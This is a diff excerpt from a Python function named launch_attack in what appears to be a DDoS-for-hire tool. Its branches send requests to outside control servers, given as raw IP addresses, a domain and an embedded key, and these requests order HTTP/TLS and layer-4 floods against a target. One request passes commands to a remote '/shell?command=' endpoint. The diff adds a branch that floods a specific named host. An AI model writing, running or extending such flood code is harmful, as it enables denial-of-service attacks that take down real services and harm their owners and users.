@@ -143,8 +143,8 @@ def launch_attack():
     elif method == "HTTPS-JYNX":
         url = f"http://217.144.185.177:5000/shell?command=./HTTPS-JYNX {target} {duration} 50&key=kriskaUSDEGR454T"
         requests.get(url)
-    elif method == "HTTPFLOOD":
-        url = f"http://gadalubau.zone.id:11121/layer7?host={target}&port={port}&time={duration}&methods=H2"
+    elif method == "FREE-TLS":
+        url = f"http://188.166.212.32:2003/layer4?host=https://load.vmheaven.io/&port=443&time=30&methods=H2"
         requests.get(url)
     elif method == "TLS":
         url = f"http://217.144.185.177:5000/shell?command=node TLS.js {target} {duration} 1 http2.txt&key=kriskaUSDEGR454T"
